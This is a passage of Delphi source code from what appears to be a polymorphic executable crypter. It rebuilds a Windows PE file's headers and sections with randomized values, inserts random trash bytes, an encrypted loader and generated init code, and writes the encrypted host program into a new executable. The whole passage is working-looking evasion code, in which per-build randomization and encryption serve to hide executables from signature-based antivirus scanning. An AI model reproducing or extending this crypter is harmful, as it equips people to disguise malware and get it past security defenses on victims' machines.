         NtHeaders.FileHeader.TimeDateStamp:=Random($20000000)+$20000000;
         NtHeaders.FileHeader.SizeOfOptionalHeader:=IMAGE_SIZEOF_NT_OPTIONAL_HEADER;
         NtHeaders.FileHeader.Characteristics:=IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_LINE_NUMS_STRIPPED
                                            or IMAGE_FILE_LOCAL_SYMS_STRIPPED or IMAGE_FILE_32BIT_MACHINE;
         case ImageType of
          itExe:NtHeaders.FileHeader.Characteristics:=NtHeaders.FileHeader.Characteristics or IMAGE_FILE_RELOCS_STRIPPED;
          itDLL:NtHeaders.FileHeader.Characteristics:=NtHeaders.FileHeader.Characteristics or IMAGE_FILE_DLL;
         end;
         RandomValue:=Random(10);
         if RandomValue>5 then NtHeaders.FileHeader.Characteristics:=NtHeaders.FileHeader.Characteristics or IMAGE_FILE_BYTES_REVERSED_LO or IMAGE_FILE_BYTES_REVERSED_HI;
 
         NtHeaders.OptionalHeader.Magic:=IMAGE_NT_OPTIONAL_HDR_MAGIC;
         NtHeaders.OptionalHeader.MajorLinkerVersion:=Random(9)+1;
         NtHeaders.OptionalHeader.MinorLinkerVersion:=Random(99)+1;
         NtHeaders.OptionalHeader.BaseOfCode:=$00001000;                //may change
         if ReqImageBase<>0 then NtHeaders.OptionalHeader.ImageBase:=RoundSize(ReqImageBase,$00010000)
         else if HostImageBase=$00400000 then NtHeaders.OptionalHeader.ImageBase:=RoundSize(HostImageBase+HostSizeOfImage+$00100000,$00010000)
         else NtHeaders.OptionalHeader.ImageBase:=$00400000;
         if not Quiet then WriteLn('ImageBase: ',IntToHex(NtHeaders.OptionalHeader.ImageBase,8));
         NtHeaders.OptionalHeader.SectionAlignment:=$00001000;          //1000h = 4096
         NtHeaders.OptionalHeader.FileAlignment:=$00000200;             //may change 200h = 512
         NtHeaders.OptionalHeader.MajorOperatingSystemVersion:=$0004;
         NtHeaders.OptionalHeader.MajorSubsystemVersion:=$0004;
         NtHeaders.OptionalHeader.SizeOfHeaders:=$00000400;             //may change
         NtHeaders.OptionalHeader.Subsystem:=HostSubsystem;
         NtHeaders.OptionalHeader.SizeOfStackReserve:=$00100000;
         NtHeaders.OptionalHeader.SizeOfStackCommit:=$00010000;         //may change
         NtHeaders.OptionalHeader.SizeOfHeapReserve:=$00100000;
         NtHeaders.OptionalHeader.SizeOfHeapCommit:=$00010000;
         NtHeaders.OptionalHeader.NumberOfRvaAndSizes:=$00000010;
 
         if not Quiet then
         begin
          WriteLn;
          WriteLn('Building .text section');
         end;
         ZeroMemory(@CodeSection,SizeOf(CodeSection));
         CopyMemory(@CodeSection.Name,PChar('.text'),5);        //may change -> CODE
         CodeSection.VirtualAddress:=NtHeaders.OptionalHeader.BaseOfCode;
         CodeSection.PointerToRawData:=NtHeaders.OptionalHeader.SizeOfHeaders;
 
         InitSize:=Random($280)+$280;
         CodeSection.SizeOfRawData:=RoundSize(LoaderPtr+LoaderSize+Trash2Size+InitSize+MainSize,RawDataAlignment);
         CodeSectionVirtualSize:=RoundSize(CodeSection.SizeOfRawData,NtHeaders.OptionalHeader.SectionAlignment);
         if CodeSectionVirtualSize<HostSizeOfImage then CodeSectionVirtualSize:=RoundSize(HostSizeOfImage,NtHeaders.OptionalHeader.SectionAlignment);
         CodeSection.Misc.VirtualSize:=CodeSectionVirtualSize;
 
         NtHeaders.OptionalHeader.SizeOfCode:=CodeSection.SizeOfRawData;
 
         CodeSection.Characteristics:=IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE or IMAGE_SCN_MEM_READ;
         if not Quiet then
         begin
          WriteLn('.text section virtual address: ',IntToHex(CodeSection.VirtualAddress,8));
          WriteLn('.text section virtual size: ',IntToHex(CodeSection.Misc.VirtualSize,8));
         end;
 
         if not Quiet then
         begin
          WriteLn;
          WriteLn('Building .idata section');
         end;
 
         NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress:=CodeSection.VirtualAddress+CodeSection.Misc.VirtualSize;        //may change
 
         ZeroMemory(@ImportSection,SizeOf(ImportSection));
         ImportSection.VirtualAddress:=NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
         ImportSectionData:=MyAlloc(HostImportSectionSize+$70);
         ZeroMemory(ImportSectionData,HostImportSectionSize+$70);
         ImportSectionDLLCount:=1;
 
         if (HostImportSectionSize<>0) and (ImageType=itDLL) and not DynamicDLL then
         begin
          PB:=VirtAddrToPhysAddr(Ptr,Pointer(HostImportSectionVirtualAddress+PImageNtHeaders(Ptr)^.OptionalHeader.ImageBase));
          Inc(PB,Cardinal(MainData));
          PImportDesc:=Pointer(PB);
          while not ((PImportDesc^.Characteristics=0) and (PImportDesc^.cTimeDateStamp=0)
            and (PImportDesc^.cForwarderChain=0) and (PImportDesc^.cName=0)
            and (PImportDesc^.cFirstThunk=nil)) do
          begin
           PB2:=VirtAddrToPhysAddr(Ptr,Pointer(PImportDesc^.cName+PImageNtHeaders(Ptr)^.OptionalHeader.ImageBase));
           Inc(PB2,Cardinal(MainData));
           if (UpperCase(PChar(PB2))<>UpperCase(Kernel32Name))
            and (UpperCase(PChar(PB2))<>UpperCase(NtdllName)) then Inc(ImportSectionDLLCount);
           Inc(PImportDesc);
          end;
         end;
 
         PB:=VirtAddrToPhysAddr(Ptr,Pointer(HostImportSectionVirtualAddress+PImageNtHeaders(Ptr)^.OptionalHeader.ImageBase));
         Inc(PB,Cardinal(MainData));
         PImportDesc:=Pointer(PB);
         PB2:=ImportSectionData;
         ZeroMemory(@ImportDesc,SizeOf(ImportDesc));
         ImportDesc.Characteristics:=ImportSection.VirtualAddress+(ImportSectionDLLCount+1)*SizeOf(ImportDesc);
         ImportDesc.cName:=ImportSection.VirtualAddress+(ImportSectionDLLCount+1)*SizeOf(ImportDesc)+(NumberOfImports+1+2*(ImportSectionDLLCount-1))*SizeOf(TImageThunkData)*2;
         ImportDesc.cFirstThunk:=Pointer(ImportDesc.Characteristics+(NumberOfImports+1+2*(ImportSectionDLLCount-1))*SizeOf(TImageThunkData));
         InitcodeThunk:=Cardinal(ImportDesc.cFirstThunk);

         CopyMemory(PB2,@ImportDesc,SizeOf(ImportDesc));
         Inc(PB2,SizeOf(ImportDesc));
         PB3:=ImportSectionData;
         Inc(PB3,(ImportSectionDLLCount+1)*SizeOf(ImportDesc));
         PB4:=ImportSectionData;
         Inc(PB4,ImportDesc.cName-ImportSection.VirtualAddress);
         CopyMemory(PB4,PChar(Kernel32Name),Kernel32Size);
         Inc(PB4,RoundSize(Kernel32Size+1,2));
 
         PCardinal(PB3)^:=Cardinal(PB4)-Cardinal(ImportSectionData)+ImportSection.VirtualAddress-2;
         CopyMemory(PB4,PChar(GetProcAddressName),GetProcAddressSize);
         Inc(PB4,RoundSize(GetProcAddressSize+1,2));
         Inc(PB3,SizeOf(DWORD));
         PCardinal(PB3)^:=Cardinal(PB4)-Cardinal(ImportSectionData)+ImportSection.VirtualAddress-2;
         CopyMemory(PB4,PChar(LoadLibraryName),LoadLibrarySize);
         Inc(PB4,RoundSize(LoadLibrarySize+1,2));
         Inc(PB3,SizeOf(DWORD));
         Inc(PB3,SizeOf(DWORD));
 
 
         if (HostImportSectionSize<>0) and (ImageType=itDLL) and not DynamicDLL then
         for I:=2 to ImportSectionDLLCount do
         begin
          ZeroMemory(@ImportDesc,SizeOf(ImportDesc));
          ImportDesc.Characteristics:=Cardinal(PB3)-Cardinal(ImportSectionData)+ImportSection.VirtualAddress;
          ImportDesc.cName:=Cardinal(PB4)-Cardinal(ImportSectionData)+ImportSection.VirtualAddress;
          ImportDesc.cFirstThunk:=Pointer(ImportDesc.Characteristics+(NumberOfImports+1+2*(ImportSectionDLLCount-1))*SizeOf(TImageThunkData));
          CopyMemory(PB2,@ImportDesc,SizeOf(ImportDesc));
          Inc(PB2,SizeOf(ImportDesc));
 
          while True do
          begin
           PB:=VirtAddrToPhysAddr(Ptr,Pointer(PImportDesc^.cName+PImageNtHeaders(Ptr)^.OptionalHeader.ImageBase));
           Inc(PB,Cardinal(MainData));
           if (UpperCase(PChar(PB))<>UpperCase(Kernel32Name))
            and (UpperCase(PChar(PB))<>UpperCase(NtdllName)) then Break;
           Inc(PImportDesc);
          end;
          AnyDWORD:=Length(PChar(PB));
          CopyMemory(PB4,PB,AnyDWORD);


          Inc(PB4,RoundSize(AnyDWORD+1,2));
          PB:=RVA2RAW(Ptr,MainData,Cardinal(PImportDesc^.cFirstThunk));
          if PCardinal(PB)^ and $80000000=0 then
          begin
           PB:=RVA2RAW(Ptr,MainData,PCardinal(PB)^);
           if PB=nil then
           begin
            PB:=RVA2RAW(Ptr,MainData,Cardinal(PImportDesc^.OriginalFirstThunk));
            if PB<>nil then
            if PCardinal(PB)^ and $80000000<>0 then
            begin
             PCardinal(PB3)^:=PCardinal(PB)^;
             PB:=nil;
            end else PB:=RVA2RAW(Ptr,MainData,PCardinal(PB)^);
           end;
           if PB<>nil then
           begin
            Inc(PB,2);
            AnyDWORD:=Length(PChar(PB));
            PCardinal(PB3)^:=Cardinal(PB4)-Cardinal(ImportSectionData)+ImportSection.VirtualAddress;
            Inc(PB4,2);
            CopyMemory(PB4,PB,AnyDWORD);
            Inc(PB4,RoundSize(AnyDWORD+1,2));
           end; 
          end else PCardinal(PB3)^:=PCardinal(PB)^;
          Inc(PImportDesc);
          Inc(PB3,SizeOf(DWORD));
          Inc(PB3,SizeOf(DWORD));
         end;
 
         PB3:=ImportSectionData;
         Inc(PB3,(ImportSectionDLLCount+1)*SizeOf(ImportDesc));
         PB:=PB3;
         AnyDWORD:=(NumberOfImports+1+2*(ImportSectionDLLCount-1))*SizeOf(TImageThunkData);
         Inc(PB,AnyDWORD);
         CopyMemory(PB,PB3,AnyDWORD);
         ImportSectionDataSize:=Cardinal(PB4)-Cardinal(ImportSectionData);

         CopyMemory(@ImportSection.Name,PChar('.idata'),6);
         ImportSection.Misc.VirtualSize:=RoundSize(ImportSectionDataSize,NtHeaders.OptionalHeader.SectionAlignment);
         ImportSection.SizeOfRawData:=RoundSize(ImportSectionDataSize,RawDataAlignment);
         ImportSection.PointerToRawData:=CodeSection.PointerToRawData+CodeSection.SizeOfRawData;
         NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size:=ImportSection.SizeOfRawData;
         ImportSection.Characteristics:=IMAGE_SCN_CNT_CODE or IMAGE_SCN_CNT_INITIALIZED_DATA or IMAGE_SCN_MEM_WRITE or IMAGE_SCN_MEM_READ;
 
         CurVirtAddr:=ImportSection.VirtualAddress+ImportSection.Misc.VirtualSize;
         CurRawData:=ImportSection.PointerToRawData+ImportSection.SizeOfRawData;
 
         if not Quiet then
         begin
          WriteLn('.idata section virtual address: ',IntToHex(ImportSection.VirtualAddress,8));
          WriteLn('.idata section virtual size: ',IntToHex(ImportSection.Misc.VirtualSize,8));
         end;
 
         // .tls Section
         if TlsSectionPresent then
         begin
          if not Quiet then
          begin
           WriteLn;
           WriteLn('Building .tls section');
          end;
          TlsCopy.Directory:=@PImageNtHeaders(Ptr)^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
          TlsCopy.SectionData:=RVA2RAW(Ptr,MainData,TlsCopy.Directory.VirtualAddress);
          if TlsCopy.SectionData<>nil then
          begin
           TlsCopy.RawDataLen:=TlsCopy.SectionData^.RawDataEnd-TlsCopy.SectionData^.RawDataStart;
           TlsCopy.RawData:=MyAlloc(TlsCopy.RawDataLen);

           PB:=RVA2RAW(Ptr,MainData,TlsCopy.SectionData^.RawDataStart-HostImageBase);
           if PB<>nil then CopyMemory(TlsCopy.RawData,PB,TlsCopy.RawDataLen)
           else ZeroMemory(TlsCopy.RawData,TlsCopy.RawDataLen);

           PB:=RVA2RAW(Ptr,MainData,TlsCopy.SectionData^.AddressOfCallbacks-HostImageBase);
           if PB=nil then
           begin
            TlsCopy.CallbacksLen:=4;
            TlsCopy.Callbacks:=MyAlloc(TlsCopy.CallbacksLen);
            ZeroMemory(TlsCopy.Callbacks,TlsCopy.CallbacksLen);
           end else
           begin
            TlsCopy.CallbacksLen:=GetTlsCallbacksLen(PB);
            TlsCopy.Callbacks:=MyAlloc(TlsCopy.CallbacksLen);
            CopyMemory(TlsCopy.Callbacks,PB,TlsCopy.CallbacksLen);
           end;

           ZeroMemory(@TlsSection,SizeOf(TlsSection));
           CopyMemory(@TlsSection.Name,PChar('.tls'),4);
           TlsSection.VirtualAddress:=CurVirtAddr;
           TlsSection.PointerToRawData:=CurRawData;
           TlsSection.Characteristics:=IMAGE_SCN_MEM_WRITE or IMAGE_SCN_MEM_READ;
 
           ZeroMemory(@TlsSectionData,SizeOf(TlsSectionData));
           TlsSectionData.RawDataStart:=NtHeaders.OptionalHeader.ImageBase+TlsSection.VirtualAddress+RoundSize(SizeOf(TlsSectionData),$10);
           TlsSectionData.RawDataEnd:=TlsSectionData.RawDataStart+TlsCopy.RawDataLen;
           TlsSectionData.AddressOfCallbacks:=RoundSize(TlsSectionData.RawDataEnd,$10);
           TlsSectionData.AddressOfIndex:=RoundSize(TlsSectionData.AddressOfCallbacks+TlsCopy.CallbacksLen,$08);
 
           TlsSection.SizeOfRawData:=RoundSize(TlsSectionData.AddressOfIndex-TlsSection.VirtualAddress-NtHeaders.OptionalHeader.ImageBase+$10,RawDataAlignment);
           TlsSection.Misc.VirtualSize:=RoundSize(TlsSection.SizeOfRawData,NtHeaders.OptionalHeader.SectionAlignment);
 
           NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress:=CurVirtAddr;       //may change
           NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size:=TlsSection.SizeOfRawData;
 
           CurVirtAddr:=TlsSection.VirtualAddress+TlsSection.Misc.VirtualSize;
           CurRawData:=TlsSection.PointerToRawData+TlsSection.SizeOfRawData;
          end else TlsSectionPresent:=False;
 
          if not Quiet then
          begin
           WriteLn('.tls section virtual address: ',IntToHex(TlsSection.VirtualAddress,8));
           WriteLn('.tls section virtual size: ',IntToHex(TlsSection.Misc.VirtualSize,8));
           if not TlsSectionPresent then WriteLn('.tls section is invalid, new executable may not work');
          end;
         end;

         if ExportSectionPresent then
         begin
          if not Quiet then
          begin
           WriteLn;
           WriteLn('Building .edata section');
          end;
          ZeroMemory(@ExportSection,SizeOf(ExportSection));
          CopyMemory(@ExportSection.Name,PChar('.edata'),6);
 
          ExportSection.VirtualAddress:=CurVirtAddr;
          ExportSection.PointerToRawData:=CurRawData;
          ExportSection.Characteristics:=IMAGE_SCN_MEM_WRITE or IMAGE_SCN_MEM_READ;
          ExportSection.SizeOfRawData:=RoundSize(ExportSectionSize,RawDataAlignment);
          ExportSection.Misc.VirtualSize:=RoundSize(ExportSection.SizeOfRawData,NtHeaders.OptionalHeader.SectionAlignment);
 
          NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress:=CurVirtAddr;       //may change
          NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size:=ExportSection.SizeOfRawData;
 
          CurVirtAddr:=ExportSection.VirtualAddress+ExportSection.Misc.VirtualSize;
          CurRawData:=ExportSection.PointerToRawData+ExportSection.SizeOfRawData;
 
          ExportData:=MyAlloc(ExportSection.Misc.VirtualSize);
          ZeroMemory(ExportData,ExportSection.Misc.VirtualSize);
 
          PB:=VirtAddrToPhysAddr(Ptr,Pointer(PImageNtHeaders(Ptr)^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress+PImageNtHeaders(Ptr)^.OptionalHeader.ImageBase));
          if PB<>nil then Inc(PB,Cardinal(MainData));
          CopyMemory(ExportData,PB,ExportSectionSize);
 
          //now fix RVAs in export section in Export Directory Table
          ExportNamePointerRVAOrg:=PExportDirectoryTable(ExportData)^.NamePointerRVA;
          ExportAddressRVAOrg:=PExportDirectoryTable(ExportData)^.ExportAddressTableRVA;
          ExportRVADelta:=ExportSection.VirtualAddress-HostExportSectionVirtualAddress;
          PExportDirectoryTable(ExportData)^.NameRVA:=PExportDirectoryTable(ExportData)^.NameRVA+ExportRVADelta;
          PExportDirectoryTable(ExportData)^.ExportAddressTableRVA:=PExportDirectoryTable(ExportData)^.ExportAddressTableRVA+ExportRVADelta;
          PExportDirectoryTable(ExportData)^.NamePointerRVA:=PExportDirectoryTable(ExportData)^.NamePointerRVA+ExportRVADelta;
          PExportDirectoryTable(ExportData)^.OrdinalTableRVA:=PExportDirectoryTable(ExportData)^.OrdinalTableRVA+ExportRVADelta;

          //+ fix RVAs in Export Name Pointer Table
          PB2:=VirtAddrToPhysAddr(Ptr,Pointer(ExportNamePointerRVAOrg+PImageNtHeaders(Ptr)^.OptionalHeader.ImageBase));
          Dec(PB2,Cardinal(PB)-Cardinal(MainData));
          Inc(PB2,Cardinal(ExportData));
          for I:=0 to PExportDirectoryTable(ExportData)^.NumberOfNamePointers-1 do
          begin
           PCardinal(PB2)^:=PCardinal(PB2)^+ExportRVADelta;
           Inc(PB2,SizeOf(DWORD));
          end;
 
          if not Quiet then
          begin
           WriteLn('export section virtual address: ',IntToHex(ExportSection.VirtualAddress,8));
           WriteLn('export section virtual size: ',IntToHex(ExportSection.Misc.VirtualSize,8));
          end;
         end;
 
         if ResourceSectionPresent then
         begin
          if not Quiet then
          begin
           WriteLn;
           WriteLn('Building .rsrc section');
          end;

          ZeroMemory(@ResourceSection,SizeOf(ResourceSection));
          CopyMemory(@ResourceSection.Name,PChar('.rsrc'),5);
 
          ResourceSection.VirtualAddress:=CurVirtAddr;
          PrepareResourceSectionData;
          ResourceSection.PointerToRawData:=CurRawData;
          ResourceSection.Characteristics:=IMAGE_SCN_MEM_READ;
          ResourceSection.SizeOfRawData:=RoundSize(ResourceSectionSize,RawDataAlignment);
          ResourceSection.Misc.VirtualSize:=RoundSize(ResourceSection.SizeOfRawData,NtHeaders.OptionalHeader.SectionAlignment);
 
          NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress:=CurVirtAddr;
          NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].Size:=ResourceSection.SizeOfRawData;
 
          CurVirtAddr:=ResourceSection.VirtualAddress+ResourceSection.Misc.VirtualSize;
          CurRawData:=ResourceSection.PointerToRawData+ResourceSection.SizeOfRawData;
 
          if not Quiet then
          begin
           WriteLn('resource section virtual address: ',IntToHex(ResourceSection.VirtualAddress,8));
           WriteLn('resource section virtual size: ',IntToHex(ResourceSection.Misc.VirtualSize,8));
          end;
         end;
 
         NtHeaders.OptionalHeader.SizeOfImage:=CurVirtAddr;
 
         if not Quiet then
         begin
          WriteLn;
          WriteLn('Building import descriptor ...');
         end;
         ZeroMemory(@ImportDesc,SizeOf(ImportDesc));
         ImportDesc.Characteristics:=ImportSection.VirtualAddress+(NumberOfDLL+1)*SizeOf(ImportDesc);
         ImportDesc.cName:=ImportSection.VirtualAddress+(NumberOfDLL+1)*SizeOf(ImportDesc)+(NumberOfImports+1)*SizeOf(TImageThunkData)*2;
         ImportDesc.cFirstThunk:=Pointer(ImportDesc.Characteristics+(NumberOfImports+1)*SizeOf(TImageThunkData));
         ThunkGetProcAddress.Ordinal:=ImportSection.VirtualAddress+(NumberOfDLL+1)*SizeOf(ImportDesc)+(NumberOfImports+1)*SizeOf(TImageThunkData)*2+Kernel32Size+2;
         ThunkLoadLibrary.Ordinal:=ThunkGetProcAddress.Ordinal+GetProcAddressSize+2+2;
 
         ZeroMemory(@NullDesc,SizeOf(NullDesc));
         TotalFileSize:=RoundSize(CurRawData,NtHeaders.OptionalHeader.FileAlignment);
         if OverlayPresent then Inc(TotalFileSize,AfterImageOverlaysSize);

         if not Quiet then
         begin
          WriteLn;
          WriteLn('Building polymorphic part ...');
         end;
         TrashSize:=KeyPtr;
         if not Quiet then
         begin
          WriteLn('Key address: ',IntToHex(KeyPtr,8));
          WriteLn('Loader address: ',IntToHex(LoaderPtr,8));
          WriteLn('Trash bytes size: ',TrashSize);
          WriteLn('Trash2 bytes size: ',Trash2Size);
         end;
 
         Trash:=MyAlloc(TrashSize);
         Trash2:=MyAlloc(Trash2Size);
         if (Trash<>nil) and (Trash2<>nil) then
         begin
          GenerateRandomBuffer(Trash,TrashSize);
          GenerateRandomBuffer(Trash2,Trash2Size);
 
          NtHeaders.OptionalHeader.AddressOfEntryPoint:=CodeSection.VirtualAddress+LoaderPtr+LoaderSize+Trash2Size;
          if not Quiet then WriteLn('Executable entry point: ',IntToHex(NtHeaders.OptionalHeader.AddressOfEntryPoint,8));
          InitData:=MyAlloc(InitSize);
          if InitData<>nil then
          begin
           VirtLoaderData:=NtHeaders.OptionalHeader.ImageBase+CodeSection.VirtualAddress+LoaderPtr;
           VirtMainData:=NtHeaders.OptionalHeader.ImageBase+CodeSection.VirtualAddress+LoaderPtr+LoaderSize+Trash2Size+InitSize;
           VirtKey:=NtHeaders.OptionalHeader.ImageBase+CodeSection.VirtualAddress+KeyPtr;
 
           //initiate DynLoader image info
           PB:=Pointer(Cardinal(LoaderData)+LoaderSize);
           while PCardinal(PB)^<>DYN_LOADER_END_MAGIC do Dec(PB);               //DYN_LOADER_END_MAGIC search
           Dec(PB,5);
           PCardinal(PB)^:=MainRealSize;
           Dec(PB,7);
           PCardinal(PB)^:=NtHeaders.OptionalHeader.AddressOfEntryPoint;
           Dec(PB,7);
           PCardinal(PB)^:=NtHeaders.OptionalHeader.SizeOfImage;
           Dec(PB,7);
           case ImageType of
            itExe:PCardinal(PB)^:=IMAGE_TYPE_EXE;
            itDLL:PCardinal(PB)^:=IMAGE_TYPE_DLL;
            itSys:PCardinal(PB)^:=IMAGE_TYPE_SYS;
            else PCardinal(PB)^:=IMAGE_TYPE_UNKNOWN;
           end;
 
           //now fix pointers in DynLoader
           //there are 3 push instructions
           LdrPtrCode:=NtHeaders.OptionalHeader.ImageBase+CodeSection.VirtualAddress;
           LdrPtrThunk:=NtHeaders.OptionalHeader.ImageBase+Cardinal(InitcodeThunk);
 
           LdrPtr:=LoaderData;
           Inc(LdrPtr);
           PCardinal(LdrPtr)^:=LdrPtrThunk+4-LdrPtrCode;
           Inc(LdrPtr,5);
           PCardinal(LdrPtr)^:=LdrPtrThunk-LdrPtrCode;
           Inc(LdrPtr,5);
           PCardinal(LdrPtr)^:=VirtMainData-LdrPtrCode;
 
           DynCoder(LoaderData,LoaderSize,Key);

           if not Quiet then WriteLn('Generating init code ...');

           //GenerateInitCode(ACodePtr,AKeyPtr,AData1Ptr,ASize1,AData2Ptr,ASize2,ADynLoadAddr,AMainPtr,
           //                 AEntryPointAddr,AImpThunk:Cardinal);

           GenerateInitCode(LdrPtrCode,KeyPtr,LoaderPtr,LoaderSize,LoaderPtr+LoaderSize+Trash2Size+InitSize,
                            MainRealSize,NtHeaders.OptionalHeader.ImageBase+CodeSection.VirtualAddress+LoaderPtr,
                            VirtMainData,NtHeaders.OptionalHeader.ImageBase+NtHeaders.OptionalHeader.AddressOfEntryPoint,
                            LdrPtrThunk);
 
           if not Quiet then
           begin
            WriteLn;
            WriteLn('Building OutputFile ...');
           end;
           FileHandle:=CreateFile(PChar(OutputFileName),GENERIC_WRITE,0,nil,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
           if FileHandle<>INVALID_HANDLE_VALUE then
           begin
            SetFilePointer(FileHandle,TotalFileSize,nil,FILE_BEGIN);
            SetEndOfFile(FileHandle);
            if not Quiet then
            begin
             WriteLn('OutputFile: ',OutputFileName,' (',TotalFileSize,')');
             WriteLn('Size of new stuff: ',TotalFileSize-MainRealSize,' bytes');
             WriteLn;
             WriteLn('Writing data ...');
             LogCnt:=0;
             WriteLn(IntToHex(LogCnt,8),': DOS header');
             Inc(LogCnt,SizeOf(DosHeader));
             WriteLn(IntToHex(LogCnt,8),': DOS stub');
             Inc(LogCnt,SizeOf(DosStub));
             WriteLn(IntToHex(LogCnt,8),': DOS stub end');
             Inc(LogCnt,SizeOf(DosStubEnd));
             WriteLn(IntToHex(LogCnt,8),': NT headers');
             Inc(LogCnt,SizeOf(NtHeaders));
             WriteLn(IntToHex(LogCnt,8),': Code section header');
             Inc(LogCnt,SizeOf(CodeSection));
             WriteLn(IntToHex(LogCnt,8),': Import section header');
             Inc(LogCnt,SizeOf(ImportSection));
             if ExportSectionPresent then
             begin
              WriteLn(IntToHex(LogCnt,8),': Export section header');
              Inc(LogCnt,SizeOf(ExportSection));
             end;
             if TlsSectionPresent then WriteLn(IntToHex(LogCnt,8),': TLS section header');

             LogCnt:=CodeSection.PointerToRawData;
             WriteLn(IntToHex(LogCnt,8),': .text:Trash');
             Inc(LogCnt,TrashSize);
             WriteLn(IntToHex(LogCnt,8),': .text:Key');
             Inc(LogCnt,KeySize);
             WriteLn(IntToHex(LogCnt,8),': .text:DynLoader');
             Inc(LogCnt,LoaderSize);
             WriteLn(IntToHex(LogCnt,8),': .text:Trash2');
             Inc(LogCnt,Trash2Size);
             WriteLn(IntToHex(LogCnt,8),': .text:Init code');
             Inc(LogCnt,InitSize);

             WriteLn(IntToHex(LogCnt,8),': .text:Host file');

             LogCnt:=ImportSection.PointerToRawData;
             WriteLn(IntToHex(LogCnt,8),': .idata');
             if TlsSectionPresent then
             begin
              LogCnt:=TlsSection.PointerToRawData;
              WriteLn(IntToHex(LogCnt,8),': .tls');
             end;
             if ExportSectionPresent then
             begin
              LogCnt:=ExportSection.PointerToRawData;
              WriteLn(IntToHex(LogCnt,8),': .edata');
             end;
             if ResourceSectionPresent then
             begin
              LogCnt:=ResourceSection.PointerToRawData;
              WriteLn(IntToHex(LogCnt,8),': .rsrc');
             end;

             if OverlayPresent then
             begin
              LogCnt:=TotalFileSize-AfterImageOverlaysSize;
              WriteLn(IntToHex(LogCnt,8),': overlay data');
             end;
            end;

            // stub
            SetFilePointer(FileHandle,0,nil,FILE_BEGIN);
            WriteFile(FileHandle,DosHeader,SizeOf(DosHeader),NumBytes,nil);
            WriteFile(FileHandle,DosStub,SizeOf(DosStub),NumBytes,nil);
            WriteFile(FileHandle,DosStubEnd,SizeOf(DosStubEnd),NumBytes,nil);
            WriteFile(FileHandle,NtHeaders,SizeOf(NtHeaders),NumBytes,nil);
            WriteFile(FileHandle,CodeSection,SizeOf(CodeSection),NumBytes,nil);
            WriteFile(FileHandle,ImportSection,SizeOf(ImportSection),NumBytes,nil);
            if TlsSectionPresent then WriteFile(FileHandle,TlsSection,SizeOf(TlsSection),NumBytes,nil);
            if ExportSectionPresent then WriteFile(FileHandle,ExportSection,SizeOf(ExportSection),NumBytes,nil);
            if ResourceSectionPresent then WriteFile(FileHandle,ResourceSection,SizeOf(ResourceSection),NumBytes,nil);

            SetFilePointer(FileHandle,ImportSection.PointerToRawData,nil,FILE_BEGIN);
            WriteFile(FileHandle,ImportSectionData^,ImportSection.SizeOfRawData,NumBytes,nil);

            // Code section
            SetFilePointer(FileHandle,CodeSection.PointerToRawData,nil,FILE_BEGIN);

            // Jmps to import section were moved to the end of the initcode
            WriteFile(FileHandle,Trash^,TrashSize,NumBytes,nil);
            WriteFile(FileHandle,Key^,KeySize,NumBytes,nil);
            WriteFile(FileHandle,LoaderData^,LoaderSize,NumBytes,nil);
            WriteFile(FileHandle,Trash2^,Trash2Size,NumBytes,nil);
            WriteFile(FileHandle,InitData^,InitSize,NumBytes,nil);

            // Data section
            WriteFile(FileHandle,MainDataCyp^,MainSize,NumBytes,nil);

            // Tls section
            if TlsSectionPresent then
            begin
             SetFilePointer(FileHandle,TlsSection.PointerToRawData,nil,FILE_BEGIN);
             WriteFile(FileHandle,TlsSectionData,SizeOf(TlsSectionData),NumBytes,nil);

             Delta:=TlsSectionData.RawDataStart-TlsSection.VirtualAddress-NtHeaders.OptionalHeader.ImageBase;
             SetFilePointer(FileHandle,TlsSection.PointerToRawData+Delta,nil,FILE_BEGIN);
             WriteFile(FileHandle,TlsCopy.RawData^,TlsCopy.RawDataLen,NumBytes,nil);

             Delta:=TlsSectionData.AddressOfCallbacks-TlsSection.VirtualAddress-NtHeaders.OptionalHeader.ImageBase;
             SetFilePointer(FileHandle,TlsSection.PointerToRawData+Delta,nil,FILE_BEGIN);
             WriteFile(FileHandle,TlsCopy.Callbacks^,TlsCopy.CallbacksLen,NumBytes,nil);
            end;

            // Export section
            if ExportSectionPresent then
            begin
             SetFilePointer(FileHandle,ExportSection.PointerToRawData,nil,FILE_BEGIN);
             WriteFile(FileHandle,ExportData^,ExportSection.SizeOfRawData,NumBytes,nil);
             if ExportData<>nil then MyFree(ExportData);
            end;

            // Resource section
            if ResourceSectionPresent then
            begin
             SetFilePointer(FileHandle,ResourceSection.PointerToRawData,nil,FILE_BEGIN);
             WriteFile(FileHandle,ResourceData^,ResourceSection.SizeOfRawData,NumBytes,nil);
             if ResourceData<>nil then MyFree(ResourceData);
            end;

            // Overlay data
            if OverlayPresent then
            begin
             SetFilePointer(FileHandle,TotalFileSize-AfterImageOverlaysSize,nil,FILE_BEGIN);
             WriteFile(FileHandle,AfterImageOverlays^,AfterImageOverlaysSize,NumBytes,nil);
            end;

            if not Quiet then WriteLn('Work completed!');
            CloseHandle(FileHandle);
           end else ErrorMsg('Unable to create OutputFile.');
           MyFree(InitData);
          end else ErrorMsg('Unable to allocate memory init data.');
          MyFree(Trash);
          MyFree(Trash2);
         end else ErrorMsg('Unable to allocate memory for trash bytes.');
         if TlsSectionPresent then
         begin
          MyFree(TlsCopy.RawData);
